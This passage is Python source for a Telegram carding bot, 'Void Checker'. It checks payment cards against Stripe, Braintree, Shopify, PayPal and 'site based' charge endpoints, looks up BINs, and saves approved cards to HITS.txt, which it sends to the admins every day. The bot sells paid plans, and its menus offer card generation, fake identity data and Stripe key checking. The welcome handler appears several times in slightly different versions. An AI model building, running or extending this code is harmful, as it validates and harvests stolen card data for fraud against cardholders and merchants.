        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(CC_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Site Based [1$]'
                    }
                    
                status = data.get('status', 'Declined ❌').replace('Declined ❌', 'DECLINED').replace('Declined \u274c', 'DECLINED')
                message = data.get('response', 'Your card was declined.')
                
                if 'Live' in status or 'Approved' in status:
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Site Based [1$]'
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Site Based [1$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Site Based [1$]'
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Site Based [1$]'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Site Based [1$]'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': card,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Site Based [1$]'
        }
# ===================== BIN LOOKUP =====================
def get_bin_info(bin_num):
    try:
        resp = requests.get(f"https://bins.antipublic.cc/bins/{bin_num}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {
                'brand': f"{data.get('brand', 'UNKNOWN')} {data.get('level', '')}".strip(),
                'bank': data.get('bank', 'UNKNOWN'),
                'country': f"{data.get('country_name', 'UNKNOWN')} {data.get('country_flag', '🌐')}",
                'type': data.get('type', 'UNKNOWN').upper()
            }
    except:
        pass
    return {
        'brand': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN 🌐',
        'type': 'UNKNOWN'
    }

# ===================== RESPONSE PARSER =====================
def parse_response(data, card):
    raw_status = str(data.get('status', '')).strip().lower()
    message = str(data.get('response', data.get('message', 'NO_DETAILS'))).strip().lower()

    if any(kw in raw_status or kw in message for kw in ['approved', 'charged', 'success', 'live', 'payment successful', 'cvv match', 'order_placed']):
        with open('HITS.txt', 'a') as f:
            f.write(f"{card} | {message}\n")
        return 'CHARGED 💎', message.capitalize() or 'Charged Successfully'

    if any(kw in message for kw in ['cvv live', 'cvv match', 'correct cvv', 'cvc match']):
        return 'CVV LIVE 🔓', 'CVV Live - Usable'

    if any(kw in message for kw in ['ccn live', 'ccn match']):
        return 'CCN LIVE 🔑', 'CCN Live - Retry CVV'

    if any(kw in message for kw in ['insufficient funds', 'low balance']):
        return 'INSUFFICIENT 💸', 'Insufficient Funds'

    if any(kw in message for kw in ['invalid cvv', 'incorrect cvc', 'cvc failed']):
        return 'DECLINED ❌', 'Incorrect CVV'

    if any(kw in message for kw in ['card_declined', 'do not honor', 'generic decline', 'declined']):
        return 'DECLINED ❌', 'Card Declined'

    if any(kw in message for kw in ['risk', 'fraud', 'blocked', 'security']):
        return 'RISK DECLINED ⚠️', 'Fraud/Risk Detected'

    return 'DECLINED ❌', message.capitalize() or 'Unknown Decline'

# ===================== MAIN CHECKER =====================
def check_shopify_cc(cc):
    start_time = time.time()
    try:
        card = cc.replace('/', '|').strip()
        parts = card.split('|')
        if len(parts) < 4:
            return {'status': 'ERROR ⚠️', 'message': 'Invalid format', 'card': card, 'time': '0.00'}

        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        yy = yy[-2:] if '20' in yy else yy

        bin_info = get_bin_info(cc_num[:6])
        formatted = f"{cc_num}|{mm}|{yy}|{cvv}"

        resp = requests.get(SHOPIFY_API_URL.format(formatted), timeout=30)
        elapsed = time.time() - start_time
        if elapsed < 10:
            time.sleep(10 - elapsed)
        total_time = f"{time.time() - start_time:.2f}"

        if resp.status_code != 200:
            return {
                'status': 'API ERROR ⚠️',
                'message': f'HTTP {resp.status_code}',
                'card': card,
                'time': total_time,
                **bin_info,
                'gateway': 'Shopify [1$]'
            }

        data = resp.json()
        status, msg = parse_response(data, card)

        return {
            'status': status,
            'message': msg,
            'card': card,
            'time': total_time,
            **bin_info,
            'gateway': 'Shopify [1$]'
        }

    except requests.exceptions.Timeout:
        return {'status': 'TIMEOUT ⏱️', 'message': 'API Timeout', 'card': cc, 'time': '30.00'}
    except Exception as e:
        return {'status': 'ERROR ⚠️', 'message': str(e), 'card': cc, 'time': '0.00'}
def check_au_cc(cc):
    try:
        # Normalize card input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate format
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe Auth 2'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Normalize year
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN defaults
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN Lookup
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted CC
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        try:
            # API request to AU endpoint
            response = requests.get(f"https://voidxstrnpe.onrender.com/gateway=as/key=void/site=epicalarc.com/cc={formatted_cc}", timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                except:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status fix
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif 'ccn' in message.lower():
                status = 'CCN'
            elif status not in ['APPROVED', 'DECLINED', 'CCN']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Auth 2'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Auth 2'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe Auth 2'
        }


def confirm_time():
    utc_now = datetime.now(timezone.utc)
    ksa_now = utc_now + timedelta(hours=3)
    ksa_date = ksa_now.date()
    if ksa_date > datetime(2025, 12, 25).date():
        return False
    return True

def format_single_response(result, user_full_name, processing_time):
    status_emoji = {
        'APPROVED': '✅',
        'DECLINED': '❌',
        'CCN': '🟡',
        'ERROR': '⚠️'
    }
    
    status_text = {
        'APPROVED': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
        'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝',
        'CCN': '𝐂𝐂𝐍',
        'ERROR': '𝐄𝐫𝐫𝐨𝐫'
    }

    # Get user ID from card result
    user_id_str = str(result.get('user_id', ''))
    
    # Determine user status
    if user_id_str == "7098912960":
        user_status = "Owner"
    elif user_id_str in ADMIN_IDS:
        user_status = "Admin"
    elif is_user_subscribed(int(user_id_str)):
        user_status = "Premium"
    else:
        user_status = "Free"

    response = f"""
┏━━━━━━━⍟
┃ {status_text[result['status']]} {status_emoji[result['status']]}
┗━━━━━━━━━━━⊛

⌯ 𝗖𝗮𝗿𝗱
   ↳<code>{result['card']}</code>
⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲↣  <i>{result['gateway']}</i> 
⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ <i>{result['message']}</i>

⌯ 𝗜𝗻𝗳𝗼↣ {result['brand']}
⌯ 𝐈𝐬𝐬𝐮𝐞𝐫↣ {result['type']}
⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲↣ {result['country']}

⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲↣ {user_full_name}[{user_status}]
⌯ 𝐁𝐨𝐭 𝐁𝐲↣⎯꯭𖣐᪵‌ ~ @spydil [OWNER]
⌯ 𝗧𝗶𝗺𝗲↣ {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
"""
    return response

def format_mchk_response(results, total_cards, processing_time, checked=0):
    approved = sum(1 for r in results if r['status'] == 'APPROVED')
    ccn = sum(1 for r in results if r['status'] == 'CCN')
    declined = sum(1 for r in results if r['status'] == 'DECLINED')
    errors = sum(1 for r in results if r['status'] == 'ERROR')
    
    status_emojis = {
        'APPROVED': '✅',
        'DECLINED': '❌',
        'CCN': '🟡',
        'ERROR': '⚠️'
    }
    
    response = f"""

✧ 𝐓𝐨𝐭𝐚𝐥↣ {checked}/{total_cards}
✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣ {checked}/{total_cards}
✧ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣ {approved}  
✧ 𝐂𝐂𝐍↣ {ccn}
✧ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣ {declined}
✧ 𝐄𝐫𝐫𝐨𝐫𝐬↣ {errors}
✧ 𝐓𝐢𝐦𝐞↣ {processing_time:.2f} 𝐒  

<b>𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸</b>
──────── ⌁ ─────────
"""
    
    for result in results:
        emoji = status_emojis.get(result['status'], '❓')
        response += f"<code>{result['card']}</code>\n𝐒𝐭𝐚𝐭𝐮𝐬➳{emoji} {result['message']}\n──────── ⌁ ─────────\n"
    
    return response

def format_broadcast_response(total, success, failed, errors, processing_time):
    return f"""
┌───────────────
│ 🔎 Total: {total}
│ ✅ Successful: {success}
│ ❌ Failed: {failed}
│ ⚠️ Errors: {errors}
│ ⏱️ Time: {processing_time:.2f} S
└───────────────
"""

def send_hits_to_admins():
    try:
        if os.path.exists('HITS.txt') and os.path.getsize('HITS.txt') > 0:
            for admin_id in ADMIN_IDS:
                with open('HITS.txt', 'rb') as f:
                    bot.send_document(admin_id, f, caption="✅ Daily Approved Cards (HITS) 📂")
    except Exception as e:
        print(f"Error sending HITS.txt: {str(e)}")

def schedule_daily_hits():
    schedule.every().day.at("05:00").do(send_hits_to_admins)  # 5:00 UTC = 8:00 KSA
    while True:
        schedule.run_pending()
        time.sleep(60)


# Handle both /start and .start
@bot.message_handler(commands=['start', 'cmds'])
@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.start') or m.text.startswith('.cmds')))
def send_welcome(message):
    # Add ban check here (NEW CODE)
    user_id = str(message.from_user.id)
    if user_id in BANNED_USERS:
        if BANNED_USERS[user_id] > time.time():
            remaining = BANNED_USERS[user_id] - time.time()
            hours = int(remaining // 3600)
            minutes = int((remaining % 3600) // 60)
            bot.reply_to(message, f"❌ You are restricted from using this bot!\nTime remaining: {hours}h {minutes}m")
            return
        else:
            del BANNED_USERS[user_id]  # Remove if ban expired
            with open('banned_users.json', 'w') as f:
                json.dump(BANNED_USERS, f)
    
    # Existing checks below (ORIGINAL CODE)
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    
    show_main_menu(message.chat.id)
def safe_edit_caption_or_text(bot, call, new_caption, reply_markup):
    try:
        current_caption = call.message.caption or call.message.text or ""
        
        # Skip if nothing changed
        if current_caption.strip() == new_caption.strip():
            bot.edit_message_reply_markup(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=reply_markup
            )
            return

        # If it's a photo message
        if call.message.photo:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=new_caption,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        else:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=new_caption,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
    except Exception as e:
        print(f"⚠️ Failed to update message: {e}")
        try:
            # Fallback: send a new message if editing fails
            bot.send_message(
                chat_id=call.message.chat.id,
                text=new_caption,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        except Exception as inner_e:
            print(f"⚠️ Fallback send failed: {inner_e}")


# Handle both /start and .start
@bot.message_handler(commands=['start', 'cmds'])
@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.start') or m.text.startswith('.cmds')))
def send_welcome(message):
    # Add ban check here (NEW CODE)
    user_id = str(message.from_user.id)
    if user_id in BANNED_USERS:
        if BANNED_USERS[user_id] > time.time():
            remaining = BANNED_USERS[user_id] - time.time()
            hours = int(remaining // 3600)
            minutes = int((remaining % 3600) // 60)
            bot.reply_to(message, f"❌ You are restricted from using this bot!\nTime remaining: {hours}h {minutes}m")
            return
        else:
            del BANNED_USERS[user_id]  # Remove if ban expired
            with open('banned_users.json', 'w') as f:
                json.dump(BANNED_USERS, f)
    
    # Existing checks below (ORIGINAL CODE)
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @STORMREDIRECT or subscribe to use in DMs.")
        return
    
    show_main_menu(message.chat.id)
# Handle both /start and .start
@bot.message_handler(commands=['start', 'cmds'])
@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.start') or m.text.startswith('.cmds')))
def send_welcome(message):
    ban_msg = check_if_banned(message.from_user.id)
    if ban_msg:
        bot.reply_to(message, ban_msg)
        return
    
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted...")
        return
    
    show_main_menu(message.chat.id)
def send_welcome(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @STORMREDIRECT or subscribe to use in DMs.")
        return
    
    show_main_menu(message.chat.id)
def create_main_menu_buttons():
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        types.InlineKeyboardButton("Gateway", callback_data="main_gateway"),
        types.InlineKeyboardButton("Tools", callback_data="main_tools"),
        types.InlineKeyboardButton("Buy", callback_data="buy_plans")
    )
    return markup

def create_gateway_submenu():
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        types.InlineKeyboardButton("Auth", callback_data="gateway_auth"),
        types.InlineKeyboardButton("Charged", callback_data="gateway_charged"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
    )
    return markup

def create_tools_submenu():
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        types.InlineKeyboardButton("Basic", callback_data="tools_basic"),
        types.InlineKeyboardButton("Standard", callback_data="tools_standard"),
        types.InlineKeyboardButton("Powerful", callback_data="tools_powerful"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
    )
    return markup

def create_auth_submenu():
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        types.InlineKeyboardButton("Stripe", callback_data="auth_stripe"),
        types.InlineKeyboardButton("Braintree", callback_data="auth_braintree"),
        types.InlineKeyboardButton("Paypal", callback_data="auth_paypal"),
        types.InlineKeyboardButton("3DS Lookup", callback_data="auth_3ds"),
        types.InlineKeyboardButton("🔙 Back", callback_data="gateway_commands")
    )
    return markup

def create_charged_submenu():
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        types.InlineKeyboardButton("Stripe", callback_data="charged_stripe"),
        types.InlineKeyboardButton("Site Based", callback_data="charged_site"),
        types.InlineKeyboardButton("Paypal", callback_data="charged_paypal"),
        types.InlineKeyboardButton("Shopify", callback_data="charged_shopify"),
        types.InlineKeyboardButton("🔙 Back", callback_data="gateway_commands")
    )
    return markup

def show_main_menu(chat_id, message_id=None):
    welcome_text = """
𝑽𝒐𝒊𝒅 ✗ 𝑪𝒉𝒆𝒄𝒌𝒆𝒓

This bot checks credit cards using Gateway.
"""
    image_url = "https://i.ibb.co/ZRnK8Bkh/Chat-GPT-Image-Jun-25-2025-09-56-53-AM.png"

    try:
        if message_id:
            bot.edit_message_media(
                chat_id=chat_id,
                message_id=message_id,
                media=types.InputMediaPhoto(image_url, caption=welcome_text),
                reply_markup=create_main_menu_buttons()
            )
        else:
            bot.send_photo(chat_id, photo=image_url, caption=welcome_text, 
                         reply_markup=create_main_menu_buttons(), parse_mode='HTML')
    except Exception as e:
        if message_id:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=welcome_text,
                reply_markup=create_main_menu_buttons(),
                parse_mode='HTML'
            )
        else:
            bot.send_message(chat_id, welcome_text, 
                           reply_markup=create_main_menu_buttons(), 
                           parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try:
        if call.data == "back_to_main":
            show_main_menu(call.message.chat.id, call.message.message_id)

        elif call.data == "main_gateway":
            safe_edit_caption_or_text(bot, call, "🔹 Select Gateway Type:", create_gateway_submenu())

        elif call.data == "main_tools":
            safe_edit_caption_or_text(bot, call, "🔹 Select Tools Category:", create_tools_submenu())

        elif call.data == "gateway_auth":
            safe_edit_caption_or_text(bot, call, "🔹 Select Auth Type:", create_auth_submenu())

        elif call.data == "gateway_charged":
            safe_edit_caption_or_text(bot, call, "🔹 Select Charged Gateway:", create_charged_submenu())

        elif call.data == "auth_braintree":
            safe_edit_caption_or_text(bot, call, """┏━━━━━[ Braintree Gate ]━━━━┓

  ⋆——✰◦BRAINTREE◦✰——⋆

• NAME: Braintree Auth   
• CMD :  /b3  -  [Single]
• NAME : Braintree Auth 🔥
• STATUS : 𝐋𝐢𝐯𝐞 ✅

 ━━━━━━━━━━


• NAME: Braintree Auth 2
• CMD : /b3  - [Mass]
• NAME : Mass Braintree Auth 🔥
• STATUS : 𝐋𝐢𝐯𝐞 ✅

 ━━━━━━━━━━

• NAME: Braintree Auth 2
• CMD: /b4 [Single] 🔥
• STATUS : 𝐋𝐢𝐯𝐞 ✅

 ━━━━━━━━━━

• NAME: Braintree Auth 2                                      
• CMD: /mb4 [Mass] 🔥
• Status: 𝐋𝐢𝐯𝐞 ✅

┗━━━━━━━━━━┛
""", create_auth_submenu())

        elif call.data == "auth_stripe":
            safe_edit_caption_or_text(bot, call, """
┏━[ Auth Base ]━┓

  ⋆——✰◦STRIPE◦✰——⋆
              
• CMD :  /chk  -  [Single]
• NAME : Stripe Auth
• STATUS : 𝐋𝐢𝐯𝐞 ✅

 ━━━━━━━━━━━━

• CMD : /mchk - [Mass]
• NAME : Mass Stripe Auth 
• STATUS : 𝐋𝐢𝐯𝐞 ✅

⋆—✰◦STRIPE2◦✰——⋆

• NAME: Authnet 
• CMD :  /au  -  [Single]
• NAME : Stripe Auth 2
• STATUS : 𝐋𝐢𝐯𝐞 ✅ 

 ━━━━━━━━━━

• CMD : /mass - [Mass]
• NAME : Mass Stripe Auth 2
• STATUS : 𝐋𝐢𝐯𝐞 ✅ 

⋆——✰◦STRIPE3◦✰——⋆

• NAME: Stripe Auth 3
• CMD: /sr [Single]

 ━━━━━━━━━━
                                      
• CMD: /msr [Mass]
• Status: 𝐋𝐢𝐯𝐞 ✅

⋆——✰◦STRIPE P.◦✰——⋆
                                      
• NAME: Stripe Premium Auth 
• CMD: /sp [Single]
• Status: 𝐋𝐢𝐯𝐞 ✅

 ━━━━━━━━━━━━

                                      
• NAME: Stripe Premium Auth                                       
• CMD: /msp [Mass]
• Status: 𝐋𝐢𝐯𝐞 ✅

┗━━━━━━━━━━━┛
""", create_auth_submenu())

        elif call.data == "auth_paypal":
            safe_edit_caption_or_text(bot, call, """
 ┏━━[ Paypal ]━━┓
                                      
• NAME: Paypal 
• CMD: /pp [Single]
• Charge: 2.00$ 🔥
• Status: 𝐋𝐢𝐯𝐞 ✅
                                      
 ┗━━━━━━━━━┛
""", create_auth_submenu())

        elif call.data == "auth_3ds":
            safe_edit_caption_or_text(bot, call, """
┏━━[ 3DS Lookup ]━━┓

• NAME: 3DS Lookup
• CMD: /vbv [Single]

 ━━━━━━━━━━━━

• NAME: Mass 3DS Lookup                                     
• CMD: /mvbv [Mass]                                   
• Status: 𝐋𝐢𝐯𝐞 ✅

┗━━━━━━━━━┛
""", create_auth_submenu())

        elif call.data == "charged_stripe":
            safe_edit_caption_or_text(bot, call, """
┏━━━[ Stripe ]━━━┓

⋆——✰◦STRIPE P.◦✰——⋆
            
• CMD :  /sx  -  [Single]
• NAME : Stripe charged 
• CHARGE : 5$ 🔥
• STATUS : 𝐋𝐢𝐯𝐞 ✅

 ━━━━━━━━━━━━

• CMD : /msx  - [Mass]
• NAME : Mass Stripe Based
• CHARGE : 5$ 🔥
• STATUS : 𝐋𝐢𝐯𝐞 ✅

┗━━━━━━━━━━━━┛
""", create_charged_submenu())

        elif call.data == "charged_site":
            safe_edit_caption_or_text(bot, call, """
┏━━━[ SITE CHARGED ]━━━━┓            
                                      
• NAME: Site Based 
• CMD: /cc [Single]
• Charge: $1.00 🔥
• Status: 𝐋𝐢𝐯𝐞 ✅

 ━━━━━━━━━━━━

• NAME: Mass Site Based 
• CMD: /mcc [Mass]
• Status: Active ✅
• Charge: $1.00 🔥

━━━━━━━━━━━━━

• NAME: Site Based 
• CMD: /mx [Single]
• Charge: $5.00 🔥
• Status: 𝐋𝐢𝐯𝐞 ✅

 ━━━━━━━━━━━━

• NAME: Mass Site Based 
• CMD: /max [Mass]
• Status: Active ✅
• Charge: $5.00 🔥

┗━━━━━━━━━━━━━┛
""", create_charged_submenu())

        elif call.data == "charged_paypal":
            safe_edit_caption_or_text(bot, call, """
┏━━━[CH. PAYPAL ]━━━┓            

• NAME: Paypal Charged  
• CMD: /pp [Single]
• Status: Active ✅
• Charge: $2.00 🔥

━━━━━━━━━━━━━━

• NAME: Paypal + Stripe 
• CMD: /ax [Single]
• Charge: $0.5$ 🔥
• Status: Active ✅

━━━━━━━━━━━━━━━

• CMD: /max [Mass]
• Status: Active ✅
• Charge: $0.5 🔥
• Status: Active ✅


┗━━━━━━━━━━━┛
""", create_charged_submenu())

        elif call.data == "charged_shopify":
            safe_edit_caption_or_text(bot, call, """
┏━━[ SHOPIFY CH ]━━━┓                        
                                      
• NAME: Shopify
• CMD: /sh [Single]
• Status: Active ✅
• Charge: $1.00 🔥

━━━━━━━━━━━━

• NAME: Mass Shopify
• CMD: /msh [Mass]
• Status: Active ✅
• Charge: $0.00 🔥

┗━━━━━━━━━━━━━┛
""", create_charged_submenu())

        elif call.data == "tools_basic":
            safe_edit_caption_or_text(bot, call, """
┏━━━[ TOOL BASIC ]━━━┓                              
                                                                      
• NAME: Basic Tools
• /bin - BIN Lookup
• /gen - Generate CCs
• /info - User Info
• /credits - Check Credits
                                      
 ┗━━━━━━━━━━━━┛                                      
""", create_tools_submenu())

        elif call.data == "tools_standard":
            safe_edit_caption_or_text(bot, call, """
┏━━━[ TOOL STANDARD ]━━━┓                                   
                                                                                                       
• NAME: Standard Tools
• /gate - Find Payment Gateways
• /fake - Generate Fake Info
• /open - Open Text File
• /split - Split File
                                      
┗━━━━━━━━━━━━┛                                                                            
""", create_tools_submenu())

        elif call.data == "tools_powerful":
            safe_edit_caption_or_text(bot, call, """
┏━━━[ TOOL OP ]━━━┓                                                                         
                                      
• NAME: Powerful Tools
• /sk - Check Stripe Key
• /pk - Check Pk Live Key
• /true - Phone Number Info
• /ai - AI Chat
• /wh - Weather Info
                                      
┗━━━━━━━━━━━┛                                                                            
""", create_tools_submenu())

        elif call.data == "buy_plans":
            plans_text = """
┏━━━━━━━⍟
┃ 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐏𝐥𝐚𝐧𝐬
┗━━━━━━━━━━━⊛
━━━━━━━━━━━━━━━━━━
• 7 Days Plan - $3 💰
✓ Unlimited CC Checks
✓ No Flood Control
✓ Standard Support
✓ Rank : Basic Plan
✓ Use in DMs
✓ Increased mass check limit (30)
─━─━─━─━─━─
• 15 Days Plan - $6 💰
✓ Unlimited CC Checks
✓ No Flood Control
✓ Priority Support
✓ Access to Private BINs
✓ Rank : Standard Plan
✓ Use in DMs
✓ Increased mass check limit (30)
─━─━─━─━─━─
• 30 Days Plan - $10 💰
✓ Unlimited CC Checks
✓ No Flood Control
✓ VIP Support (Faster Response)
✓ Access to Private BINs
✓ Early Access to New Features
✓ Rank : Premium Plan
✓ Use in DMs
✓ Increased mass check limit (30)
─━─━─━─━─━─
• Payment Method:
💳 UPI ID: `DM`
📩 Contact: @spydil to purchase
━━━━━━━━━━━━━━━━━━
"""
            safe_edit_caption_or_text(bot, call, plans_text, create_main_menu_buttons())

        elif call.data == "gateway_commands":
            safe_edit_caption_or_text(bot, call, "🔹 Select Gateway Type:", create_gateway_submenu())

    except Exception as e:
        print(f"Error handling callback: {e}")

        
# Handle both /grant and .grant
@bot.message_handler(commands=['grant'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.grant'))
def grant_access(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    try:
        chat_id = message.text.split()[1]

        # Add to local set
        APPROVED_GROUPS.add(chat_id)

        # Save to Firebase
        write_firebase("approved_groups", list(APPROVED_GROUPS))

        # Optionally still save to local file (for backup or offline use)
        with open('approved_groups.txt', 'a') as f:
            f.write(f"{chat_id}\n")

        bot.reply_to(message, f"✅ Group {chat_id} has been added to the approved list.")

    except Exception as e:
        bot.reply_to(message, "❌ Invalid format. Use /grant chat_id or .grant chat_id")


# Handle both /addcr and .addcr
@bot.message_handler(commands=['addcr'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.addcr'))
def handle_add_credits(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Invalid format. Use /addcr user_id credits or .addcr user_id credits")
            return

        user_id = parts[1]
        try:
            credits = int(parts[2])
            if credits <= 0:
                bot.reply_to(message, "❌ Credits must be a positive number")
                return
        except ValueError:
            bot.reply_to(message, "❌ Credits must be a number")
            return

        # Load existing user credits from Firebase
        USER_CREDITS = read_firebase("user_credits")

        # Initialize user if not exists
        if user_id not in USER_CREDITS:
            USER_CREDITS[user_id] = {
                'date': str(datetime.now().date()),
                'credits': 0
            }

        # Add credits
        USER_CREDITS[user_id]['credits'] += credits

        # Save back to Firebase
        write_firebase("user_credits", USER_CREDITS)

        bot.reply_to(message, f"✅ Added {credits} credits to user {user_id}. Total credits now: {USER_CREDITS[user_id]['credits']}")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /subs and .subs
@bot.message_handler(commands=['subs'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.subs'))
def handle_subscription(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Invalid format. Use /subs user_id plan (1=7d, 2=15d, 3=30d)")
            return
            
        user_id = parts[1]
        plan = int(parts[2])
        
        if plan not in [1, 2, 3,]:
            bot.reply_to(message, "❌ Invalid plan. Use 1=7d, 2=15d, 3=30d")
            return
            
        # Calculate expiry date
        if plan == 1:
            days = 7
        elif plan == 2:
            days = 15
        else:
            days = 30
            
        
            
        expiry_date = datetime.now() + timedelta(days=days)
        expiry_str = expiry_date.strftime("%Y-%m-%d")
        
        # Add to subscribed users in Firebase
        SUBSCRIBED_USERS[user_id] = {
            'plan': plan,
            'expiry': expiry_str
        }
        
        # Save to Firebase
        write_firebase("subscribed_users", SUBSCRIBED_USERS)
            
        bot.reply_to(message, f"✅ User {user_id} subscribed to plan {plan} (expires {expiry_str})")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['generate'])
